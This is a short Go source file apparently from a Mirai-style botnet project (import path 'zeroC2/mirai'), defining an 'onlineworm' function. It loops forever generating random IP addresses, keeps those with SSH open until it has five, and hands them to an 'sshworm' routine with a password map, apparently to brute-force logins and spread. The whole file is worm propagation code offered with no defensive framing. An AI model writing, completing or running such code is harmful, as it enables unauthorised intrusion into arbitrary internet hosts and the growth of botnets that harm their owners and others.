package worm

import (
	"math/rand"
	"time"
	skills "zeroC2/mirai/components/skills"
)

func onlineworm() {
	for {
		var active []string
		s1 := rand.NewSource(time.Now().UnixNano())
		r1 := rand.New(s1)
	term:
		for {
			ip := skills.GenerateIp(*r1)
			if skills.IsSSHOpen(ip) {
				active = append(active, ip)
				if len(active) > 4 {
					break term
				}
			}
		}

		sshworm(active, passwordMap)

	}
}
